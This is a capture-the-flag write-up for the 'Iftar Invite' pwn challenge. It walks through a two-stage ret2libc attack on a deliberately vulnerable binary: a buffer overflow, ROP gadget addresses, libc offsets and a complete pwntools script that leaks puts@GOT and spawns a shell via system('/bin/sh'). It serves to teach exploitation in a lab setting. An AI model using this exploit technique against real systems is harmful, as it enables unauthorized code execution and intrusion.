---
title: "Ramadan CTF 2026 - Iftar Invite"
date: 2026-03-16 08:20:00 +0100
categories: [ramadan_ctf_2026]
tags: [pwn, ret2libc, rop, writeup, 4n7h4r4x, ramadan_ctf_2026, medium]
---

# [ Iftar Invite ] Writeup

**Category:** Pwn (ret2libc)  
**Difficulty:** Medium  
**Author:** 4n7h4r4x  

![challenge](/assets/images/ramadan_ctf_2026/iftar_invite/iftar_invite_challenge.png)

## Tools Used

- `ghidra` / `gdb` for reverse engineering
- `ropper` / `ROPgadget` for finding gadgets
- `python3 (pwntools)` for exploit scripting

---

## Overview

This is a classic **ret2libc** challenge. The binary has a buffer overflow but no win function and NX is enabled (no shellcode on the stack). We need to leak a libc address, calculate offsets, and return to `system("/bin/sh")`.

A custom `libc.so.6` and `ld-linux-x86-64.so.2` are provided -- this is a strong hint that you need to use specific libc offsets.

---

## Initial Recon

Running `file` and `checksec`:

![file and checksec](/assets/images/ramadan_ctf_2026/iftar_invite/iftar_invite_file_checksec.png)

The binary is **non-PIE** and **dynamically linked**. This means:
- Code addresses are fixed (no ASLR on the binary itself)
- libc is loaded at a random base address (ASLR) -- we need to leak it
- NX is on -- no executing shellcode on the stack

---

## Reverse Engineering

In Ghidra, the `challenge` function reads our input into a buffer with a clear overflow:

![ghidra](/assets/images/ramadan_ctf_2026/iftar_invite/iftar_invite_ghidra.png)

The buffer is at `rbp - 0x40`, and we can overflow it. The offset to RIP is **0x48** bytes (0x40 buffer + 0x8 saved RBP).

The binary imports `puts` from libc -- we'll use it to leak libc addresses.

---

## Exploitation Plan

This is a **two-stage** ret2libc attack:

**Stage 1 -- Leak libc:**
1. Overflow the buffer to control RIP.
2. Use `pop rdi; ret` gadget to set RDI = `puts@GOT` (which contains the runtime address of `puts` in libc).
3. Call `puts@PLT` to print the leaked address.
4. Return to `challenge` to get a second overflow.

**Stage 2 -- Shell:**
1. Calculate libc base from the leaked `puts` address.
2. Compute `system` and `"/bin/sh"` addresses.
3. Overflow again: `pop rdi; ret` -> `"/bin/sh"` -> `ret` (stack alignment) -> `system`.

### Finding Gadgets

Using `ropper` or `ROPgadget` on the binary:

![ropper](/assets/images/ramadan_ctf_2026/iftar_invite/iftar_invite_ropper.png)

```bash
0x4013a3: pop rdi; ret;
0x40101a: ret;            # for stack alignment
```

### Computing Libc Offsets

With the provided `libc.so.6`:

```bash
readelf -s libc.so.6 | grep -E " puts@@| system@@"
strings -a -t x libc.so.6 | grep "/bin/sh"
```

- `puts` offset: `0x84420`
- `system` offset: `0x52290`
- `"/bin/sh"` offset: `0x1b45bd`

> **Tip:** Always use the provided libc! The remote server uses it, and offsets differ between libc versions. Tools like `patchelf` can help you run the binary locally with the provided libc.

---

## Solution

```python
from pwn import *

context.binary = elf = ELF("./iftar_invite", checksec=False)

#p = elf.process()
p = remote("localhost", 9988)

challenge = p64(elf.sym.challenge)
puts_plt = p64(elf.sym.puts)
puts_got = p64(elf.got.puts)

pop_rdi = p64(0x00000000004013a3)
ret = p64(0x000000000040101a)

# Stage 1: Leak puts@libc
pay1 = b"A" * 0x48 + pop_rdi + puts_got + puts_plt + challenge

p.recvuntil(b">")
p.send(pay1)

p.recvuntil(b"See you tonight")
p.recvline()

puts = u64(p.recvline()[:-1].ljust(8, b"\x00"))
libc_base = puts - 0x84420
system = libc_base + 0x52290
binsh = libc_base + 0x1b45bd

log.success(f"{hex(puts)=}")
log.success(f"{hex(libc_base)=}")
log.success(f"{hex(system)=}")
log.success(f"{hex(binsh)=}")

# Stage 2: system("/bin/sh")
pay2 = b"A" * 0x48 + pop_rdi + p64(binsh) + ret + p64(system)
p.recvuntil(b">")
p.send(pay2)

p.interactive()
```

![flag](/assets/images/ramadan_ctf_2026/iftar_invite/iftar_invite_flag.png)

---

## Key Takeaways

- **ret2libc** is the go-to technique when NX is enabled and there's no win function. Leak a libc address, compute offsets, call `system("/bin/sh")`.
- **GOT/PLT** separation: `puts@GOT` holds the runtime libc address, `puts@PLT` is the trampoline to call it. Leaking GOT entries is the standard way to defeat ASLR.
- **Stack alignment**: On x86-64, `system()` (and many libc functions) require the stack to be **16-byte aligned** when called. Adding a `ret` gadget before the function call fixes misalignment.
- **Two-stage attacks**: By returning to the vulnerable function after the first stage, you get another overflow opportunity to deliver the final payload.

## Helpful Resources

- [ret2libc explained - ir0nstone](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc)
- [x64 calling convention](https://wiki.osdev.org/System_V_ABI)

Thanks for reading!
